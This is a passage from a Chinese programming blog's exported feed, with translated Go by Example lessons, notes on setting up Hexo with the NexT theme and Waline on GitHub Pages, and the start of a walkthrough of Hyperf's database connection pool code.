<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> fmt</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 使用var关键字声明一个变量并赋值，变量名在前，类型在后</span></span><br><span class="line">    <span class="keyword">var</span> a <span class="type">string</span> = <span class="string">&quot;initial&quot;</span></span><br><span class="line">    fmt.Println(a)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可以一次性初始化多个变量并赋值</span></span><br><span class="line">    <span class="keyword">var</span> b,c <span class="type">int</span> = <span class="number">1</span>, <span class="number">2</span></span><br><span class="line">    fmt.Println(b, c)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// golang会自动推断出未显式声明类型的变量</span></span><br><span class="line">    <span class="keyword">var</span> d = <span class="literal">true</span></span><br><span class="line">    fmt.Println(d)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化未赋值的变量，golang默认会赋值其相应类型的零值</span></span><br><span class="line">    <span class="keyword">var</span> e <span class="type">int</span></span><br><span class="line">    fmt.Println(e)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 也可以使用&#x27;:=&#x27;操作符</span></span><br><span class="line">    f := <span class="string">&quot;short&quot;</span></span><br><span class="line">    fmt.Println(f)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go run variables.go</span><br><span class="line">initial</span><br><span class="line">1 2</span><br><span class="line"><span class="literal">true</span></span><br><span class="line">0</span><br><span class="line">short</span><br></pre></td></tr></table></figure>


<p>原文链接：<a href="https://gobyexample.com/variables">Go by Example: Variables</a></p>
]]></content>
      <categories>
        <category>golang</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Go by Example - Variadic Functions</title>
    <url>/2017/07/18/go-by-example-variadic-function/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-Variadic-Functions"><a href="#Go-by-Example-Variadic-Functions" class="headerlink" title="Go by Example: Variadic Functions"></a><center>Go by Example: Variadic Functions</center></h2><p>可以使用任意数量的参数来调用可变参数函数，如<code>fmt.Println</code>就是一个常用的可变参数函数。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个函数，可以接受任意数量的int值作为参数。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sum</span><span class="params">(nums ...<span class="type">int</span>)</span></span> &#123;</span><br><span class="line">    fmt.Print(nums, <span class="string">&quot; &quot;</span>)</span><br><span class="line">    total := <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _, num := <span class="keyword">range</span> nums &#123;</span><br><span class="line">        total += num</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(total)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 使用独立的参数调用。</span></span><br><span class="line">    sum(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">    sum(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 使用相应类型的slice调用可变参数函数。func(slice...)。</span></span><br><span class="line">    nums := []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line">    sum(nums...)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go run variadic-functions.go </span><br><span class="line">[1 2] 3</span><br><span class="line">[1 2 3] 6</span><br><span class="line">[1 2 3 4] 10</span><br></pre></td></tr></table></figure>


<p>原文链接：<a href="https://gobyexample.com/variadic-functions">Go by Example: Variadic Functions</a></p>
]]></content>
      <categories>
        <category>golang</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Go by Example - Worker Pools</title>
    <url>/2017/11/23/go-by-example-worker-pool/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-Worker-Pools"><a href="#Go-by-Example-Worker-Pools" class="headerlink" title="Go by Example: Worker Pools"></a><center>Go by Example: Worker Pools</center></h2><p>这节探索如何使用<code>goroutine</code>和<code>channel</code>实现工作池的功能。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这个是工作进程，用来执行并发的任务</span></span><br><span class="line"><span class="comment">// 每个进程都会从管道jobs接受工作，并且将相应发送至管道results</span></span><br><span class="line"><span class="comment">// 每个工作我们都会睡眠一秒用以模拟一项耗时的任务</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">worker</span><span class="params">(id <span class="type">int</span>, jobs &lt;-<span class="keyword">chan</span> <span class="type">int</span>, results <span class="keyword">chan</span>&lt;- <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> j := <span class="keyword">range</span> jobs &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;worker&quot;</span>, id, <span class="string">&quot;started job&quot;</span>, j)</span><br><span class="line">        time.Sleep(time.Second)</span><br><span class="line">        fmt.Println(<span class="string">&quot;worker&quot;</span>, id, <span class="string">&quot;finished job&quot;</span>, j)</span><br><span class="line">        results &lt;- j * <span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 初始化两个管道用以给工作进程分配任务及接收结果</span></span><br><span class="line">    jobs := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">100</span>)</span><br><span class="line">    results := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 启动三个工作进程</span></span><br><span class="line">    <span class="comment">// 此时它们是阻塞的，因为管道jobs是空的</span></span><br><span class="line">    <span class="keyword">for</span> w:= <span class="number">1</span>; w &lt;= <span class="number">3</span>; w++ &#123;</span><br><span class="line">        <span class="keyword">go</span> worker(w, jobs, results)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化5个任务</span></span><br><span class="line">    <span class="comment">// 关闭管道jobs，标识没有多余的任务了</span></span><br><span class="line">    <span class="keyword">for</span> j:= <span class="number">1</span>; j &lt;= <span class="number">5</span>; j++ &#123;</span><br><span class="line">        jobs &lt;- j</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">close</span>(jobs)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 收集所有任务的结果</span></span><br><span class="line">    <span class="keyword">for</span> a := <span class="number">1</span>; a &lt;= <span class="number">5</span>; a++ &#123;</span><br><span class="line">        &lt;-results</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tashuo:golang ta_shuo$ go run worker-pool.go</span><br><span class="line">worker 3 started job 1</span><br><span class="line">worker 2 started job 3</span><br><span class="line">worker 1 started job 2</span><br><span class="line">worker 3 finished job 1</span><br><span class="line">worker 3 started job 4</span><br><span class="line">worker 2 finished job 3</span><br><span class="line">worker 1 finished job 2</span><br><span class="line">worker 2 started job 5</span><br><span class="line">worker 2 finished job 5</span><br><span class="line">worker 3 finished job 4</span><br></pre></td></tr></table></figure>

<p>通过输出可以看出5个任务被多个工作进程执行。程序只消耗了2秒多而不是5秒，是因为所有的任务被3个工作进程并发处理。</p>
<p>原文链接：<a href="https://gobyexample.com/worker-pools">Go by Example: Worker Pools</a></p>
]]></content>
      <categories>
        <category>golang</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>hexo next及github配置</title>
    <url>/2023/01/12/hexo-next/</url>
    <content><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>之前博客许久未打理，本地的node环境和hexo版本也比较陈旧，删除了github旧仓库重新跑了一遍，做下记录以便日后参考</p>
<h3 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h3><blockquote>
<p><a href="https://hexo.io/zh-cn/docs/">hexo文档</a></p>
</blockquote>
<blockquote>
<p><a href="https://theme-next.js.org/docs/getting-started/">next主题文档</a></p>
</blockquote>
<h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><ol>
<li><p>安装hexo及项目初始化</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$: npm install -g hexo-cli <span class="comment"># 安装hexo</span></span><br><span class="line"></span><br><span class="line">$: hexo init my_project <span class="comment"># 初始化项目</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>项目配置</p>
<p> <a href="https://hexo.io/zh-cn/docs/configuration">配置</a></p>
</li>
<li><p>安装next主题</p>
<p> <a href="https://theme-next.js.org/docs/getting-started/">Getting Started</a></p>
<p> 此处使用git方式下载的包在生成静态文件时index.html中包含模板标签，访问有问题，暂时没找到原因，所以使用了npm方式安装：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$: <span class="built_in">cd</span> my_project &amp;&amp; npm install hexo-theme-next <span class="comment"># 安装next主题</span></span><br><span class="line">$: <span class="built_in">cp</span> -rp node_modules/hexo-theme-next themes/next <span class="comment"># 此处将npm包拷贝到项目的themes目录，方便主题配置文件的版本管理</span></span><br><span class="line">$: npm uninstall hexo-theme-next</span><br></pre></td></tr></table></figure>
<span id="more"></span></li>
<li><p>启用next主题</p>
 <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 项目的_config.yml</span></span><br><span class="line"><span class="comment"># Extensions</span></span><br><span class="line"><span class="comment">## Plugins: https://hexo.io/plugins/</span></span><br><span class="line"><span class="comment">## Themes: https://hexo.io/themes/</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">next</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>主题自定义配置</p>
<p> <a href="https://theme-next.iissnan.com/getting-started.html">开始使用</a></p>
</li>
<li><p>第三方插件</p>
<ol>
<li>字数统计 <a href="https://hexo-next.readthedocs.io/zh_CN/latest/next/advanced/%E5%AD%97%E6%95%B0%E7%BB%9F%E8%AE%A1/">字数统计</a></li>
<li>本地搜索 <a href="https://theme-next.iissnan.com/third-party-services.html#local-search">第三方服务集成</a></li>
<li>Disqus评论插件 <a href="https://theme-next.iissnan.com/third-party-services.html#disqus">第三方服务集成</a></li>
<li>Waline评论及阅读数统计插件 <a href="https://waline.js.org/guide/get-started/">快速上手</a><ol>
<li>根据上面文档指引，创建并且成功部署Vercel，<em>HTML 引入 (客户端)部分</em>不用做</li>
<li>hexo安装waline扩展并且在主题中进行配置 <code>$:npm install @waline/hexo-next</code> <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">waline:</span></span><br><span class="line">  <span class="comment"># New! Whether enable this plugin</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Waline server address url, you should set this to your own link</span></span><br><span class="line">  <span class="attr">serverURL:</span> <span class="string">https://your-domain.vercel.app</span> <span class="comment"># 替换为你自己的域名</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Waline library CDN url, you can set this to your preferred CDN</span></span><br><span class="line">  <span class="attr">libUrl:</span> <span class="string">https://unpkg.com/@waline/client@v2/dist/waline.js</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Waline CSS styles CDN url, you can set this to your preferred CDN</span></span><br><span class="line">  <span class="attr">cssUrl:</span> <span class="string">https://unpkg.com/@waline/client@v2/dist/waline.css</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Custom locales</span></span><br><span class="line">  <span class="comment"># locale:</span></span><br><span class="line">  <span class="comment">#   placeholder: Welcome to comment # Comment box placeholder</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># If false, comment count will only be displayed in post page, not in home page</span></span><br><span class="line">  <span class="attr">commentCount:</span> <span class="literal">true</span> <span class="comment"># 开启评论数展示</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Pageviews count, <span class="doctag">Note:</span> You should not enable both `waline.pageview` and `leancloud_visitors`.</span></span><br><span class="line">  <span class="attr">pageview:</span> <span class="literal">true</span> <span class="comment"># 开启阅读数展示</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Custom emoji</span></span><br><span class="line">  <span class="attr">emoji:</span></span><br><span class="line">  <span class="comment">#   - https://unpkg.com/@waline/emojis@1.0.1/weibo</span></span><br><span class="line">  <span class="comment">#   - https://unpkg.com/@waline/emojis@1.0.1/alus</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">https://unpkg.com/@waline/emojis@1.0.1/bilibili</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">https://unpkg.com/@waline/emojis@1.0.1/qq</span></span><br><span class="line">  <span class="comment">#   - https://unpkg.com/@waline/emojis@1.0.1/tieba</span></span><br><span class="line">  <span class="comment">#   - https://unpkg.com/@waline/emojis@1.0.1/tw-emoji</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Comment infomation, valid meta are nick, mail and link</span></span><br><span class="line">  <span class="comment"># meta:</span></span><br><span class="line">  <span class="comment">#   - nick</span></span><br><span class="line">  <span class="comment">#   - mail</span></span><br><span class="line">  <span class="comment">#   - link</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Set required meta field, e.g.: [nick] | [nick, mail]</span></span><br><span class="line">  <span class="comment"># requiredMeta:</span></span><br><span class="line">  <span class="comment">#   - nick</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Language, available values: en-US, zh-CN, zh-TW, pt-BR, ru-RU, jp-JP</span></span><br><span class="line">  <span class="attr">lang:</span> <span class="string">zh-CN</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Word limit, no limit when setting to 0</span></span><br><span class="line">  <span class="comment"># wordLimit: 0</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Whether enable login, can choose from &#x27;enable&#x27;, &#x27;disable&#x27; and &#x27;force&#x27;</span></span><br><span class="line">  <span class="comment"># login: enable</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># comment per page</span></span><br><span class="line">  <span class="attr">pageSize:</span> <span class="number">10</span></span><br></pre></td></tr></table></figure>
</li>
<li>开启了<strong>pageview</strong>的话需要在leancloud应用的结构化数据中创建<code>Counter</code>这个Class，本质上阅读数存储在<code>Counter</code> 表中，评论数据存储在<code>Comment</code> 表中</li>
</ol>
</li>
<li><del>leancloud阅读次数</del> (Waline可以做)此路不通，不管是国内还国外的云函数部署都需要绑定独立的域名才能使用，暂时没有多余的域名</li>
</ol>
</li>
<li><p>增加标签页面和分类页面</p>
<p> <a href="https://theme-next.iissnan.com/theme-settings.html#tags-page">主题配置</a></p>
<p> <a href="https://theme-next.iissnan.com/theme-settings.html#categories-page">主题配置</a></p>
<p> 这样可以在主题的menu配置中加上这两个页面，不然<code>public/tags</code>和<code>public/categories</code>文件夹不会生成<code>index.html</code></p>
</li>
<li><p>github-page配置<br> <a href="https://docs.github.com/zh/pages/getting-started-with-github-pages/creating-a-github-pages-site">Github Page</a></p>
</li>
<li><p>项目部署配置<br> <a href="https://hexo.io/zh-cn/docs/github-pages#%E4%B8%80%E9%94%AE%E9%83%A8%E7%BD%B2">Hexo一键部署</a></p>
</li>
<li><p>git hook配置</p>
<p>关联到github-page后，仓库源文件在master分支，public静态资源在gh-pages分支，增加hook可以更加方便的维护源文件和部署静态文件：</p>
<ol>
<li>新增或修改项目下的hook文件<code>.git/hook/pre-push</code> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">branch=<span class="string">&quot;<span class="subst">$(git rev-parse --symbolic --abbrev-ref $(git symbolic-ref HEAD)</span>)&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$branch</span>&quot;</span> = <span class="string">&quot;master&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span> </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;---- start deploy -----&quot;</span></span><br><span class="line">    /usr/local/bin/hexo g -d <span class="comment"># 此处修改为本地hexo的执行路径</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure>
</li>
<li>增加可执行的文件权限 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$: <span class="built_in">chmod</span> +x .git/hook/pre-push</span><br></pre></td></tr></table></figure></li>
</ol>
<p>这样配置之后，新增的md格式文章在master分支编辑完成直接commit+push，会自动生成静态页面并且部署至远程服务器，不需要额外的操作，也保证了仓库的源文件与静态文件版本的一致</p>
</li>
</ol>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>next</tag>
      </tags>
  </entry>
  <entry>
    <title>Hyperf db连接池</title>
    <url>/2023/01/08/hyperf-db-connection-pool/</url>
    <content><![CDATA[<h3 id="连接池"><a href="#连接池" class="headerlink" title="连接池"></a><a href="https://hyperf.wiki/3.0/#/zh-cn/db/quick-start">连接池</a></h3><blockquote>
<p><a href="https://github.com/hyperf/database">hyperf/database</a> 组件是基于 <a href="https://github.com/illuminate/database">illuminate/database</a> 衍生出来的组件，我们对它进行了一些改造，从设计上是允许用于其它 PHP-FPM 框架或基于 Swoole 的框架中的，而在 Hyperf 里就需要提一下 <a href="https://github.com/hyperf/db-connection">hyperf/db-connection</a> 组件，它基于 <a href="https://github.com/hyperf/pool">hyperf/pool</a> 实现了数据库连接池并对模型进行了新的抽象，以它作为桥梁，Hyperf 才能把数据库组件及事件组件接入进来。</p>
</blockquote>
<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>Hyperf的db使用有两种方式，是否走ORM，ORM会对db查询及响应做多一层封装，底层最终也是通过<code>connection</code> 发起db请求。</p>
<span id="more"></span>

<p><code>Hyperf\DbConnection\Model\Model</code> 继承 <code>Hyperf\Database\Model/Model</code> ，所有的db请求通过 <code>Hyperf\Database\Model\Bulder</code> 发出：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vendor/hyperf/database/src/Model/Model.php   </span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Handle dynamic method calls into the model.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $method</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array $parameters</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$parameters</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, [<span class="string">&#x27;increment&#x27;</span>, <span class="string">&#x27;decrement&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;&#123;<span class="variable">$method</span>&#125;(...<span class="variable">$parameters</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">call</span>([<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">newQuery</span>(), <span class="variable">$method</span>], <span class="variable">$parameters</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最终都是获取到 Hyperf\Database\Model\Bulder 的实例</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Get a new query builder for the model&#x27;s table.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> \Hyperf\Database\Model\Builder</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">newQuery</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">registerGlobalScopes</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">newQueryWithoutScopes</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Get a new query builder that doesn&#x27;t have any global scopes or eager loading.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> \Hyperf\Database\Model\Builder|static</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">newModelQuery</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">newModelBuilder</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">newBaseQueryBuilder</span>())-&gt;<span class="title function_ invoke__">setModel</span>(<span class="variable">$this</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Get a new query builder instance for the connection.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> \Hyperf\Database\Query\Builder</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">newBaseQueryBuilder</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$connection</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">QueryBuilder</span>(<span class="variable">$connection</span>, <span class="variable">$connection</span>-&gt;<span class="title function_ invoke__">getQueryGrammar</span>(), <span class="variable">$connection</span>-&gt;<span class="title function_ invoke__">getPostProcessor</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Get the database connection for the model.</span></span><br><span class="line"><span class="comment"> * You can write it by yourself.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getConnection</span>(<span class="params"></span>): <span class="title">ConnectionInterface</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Register</span>::<span class="title function_ invoke__">resolveConnection</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getConnectionName</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如上代码所示，db请求都会进入到 <code>Hyperf\Database\Query\Builder</code> ，之后通过自身的<code>connection</code> 属性完成db请求，而<code>connection</code> 属性由上面最后一个方法注入<code>Register::*resolveConnection*($this-&gt;getConnectionName())</code> :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vendor/hyperf/database/src/Model/Register.php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Resolve a connection instance.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> null|string $connection</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> ConnectionInterface</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">resolveConnection</span>(<span class="params"><span class="variable">$connection</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">static</span>::<span class="variable">$resolver</span>-&gt;<span class="title function_ invoke__">connection</span>(<span class="variable">$connection</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>$resolver</code> 属性框架启动时注入:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vendor/hyperf/db-connection/src/Listener/RegisterConnectionResolverListener.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">listen</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="title class_">BootApplication</span>::<span class="variable language_">class</span>,</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"><span class="keyword">object</span> <span class="variable">$event</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;container-&gt;<span class="title function_ invoke__">has</span>(<span class="title class_">ConnectionResolverInterface</span>::<span class="variable language_">class</span>)) &#123;</span><br><span class="line">        <span class="title class_">Register</span>::<span class="title function_ invoke__">setConnectionResolver</span>(</span><br><span class="line">            <span class="variable">$this</span>-&gt;container-&gt;<span class="title function_ invoke__">get</span>(<span class="title class_">ConnectionResolverInterface</span>::<span class="variable language_">class</span>)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ConnectionResolverInterface::class</code> 在 <code>ConfigProvider</code> 中注入：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vendor/hyperf/db-connection/src/ConfigProvider.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="string">&#x27;dependencies&#x27;</span> =&gt; [</span><br><span class="line">            <span class="title class_">PoolFactory</span>::<span class="variable language_">class</span> =&gt; <span class="title class_">PoolFactory</span>::<span class="variable language_">class</span>,</span><br><span class="line">            <span class="title class_">ConnectionFactory</span>::<span class="variable language_">class</span> =&gt; <span class="title class_">ConnectionFactory</span>::<span class="variable language_">class</span>,</span><br><span class="line">            <span class="title class_">ConnectionResolverInterface</span>::<span class="variable language_">class</span> =&gt; <span class="title class_">ConnectionResolver</span>::<span class="variable language_">class</span>,</span><br><span class="line">            <span class="string">&#x27;db.connector.mysql&#x27;</span> =&gt; <span class="title class_">MySqlConnector</span>::<span class="variable language_">class</span>,</span><br><span class="line">            <span class="title class_">MigrationRepositoryInterface</span>::<span class="variable language_">class</span> =&gt; <span class="title class_">DatabaseMigrationRepositoryFactory</span>::<span class="variable language_">class</span>,</span><br><span class="line">        ],</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><code>connection</code> 属性：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vendor/hyperf/db-connection/src/ConnectionResolver.php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Get a database connection instance.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $name</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> ConnectionInterface</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connection</span>(<span class="params"><span class="variable">$name</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getDefaultConnection</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$connection</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getContextKey</span>(<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">Context</span>::<span class="title function_ invoke__">has</span>(<span class="variable">$id</span>)) &#123;</span><br><span class="line">        <span class="variable">$connection</span> = <span class="title class_">Context</span>::<span class="title function_ invoke__">get</span>(<span class="variable">$id</span>);</span><br><span class="line">    